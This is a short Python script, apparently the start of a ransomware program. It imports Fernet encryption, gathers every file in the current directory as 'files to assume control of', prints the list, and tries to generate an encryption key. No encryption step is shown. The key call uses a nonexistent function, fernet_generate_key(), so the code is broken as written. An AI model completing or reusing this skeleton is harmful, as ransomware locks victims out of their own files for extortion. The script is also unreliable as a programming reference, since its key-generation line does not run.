import os 
# fernet is a method of encryption provents minipulation without the key
from cryptography.fernet import Fernet

# finding files to assume control of
files = [] 

for file in os.listdir():
    if os.path.isfile(file):
        files.append(file)
print(files)

key = fernet_generate_key()
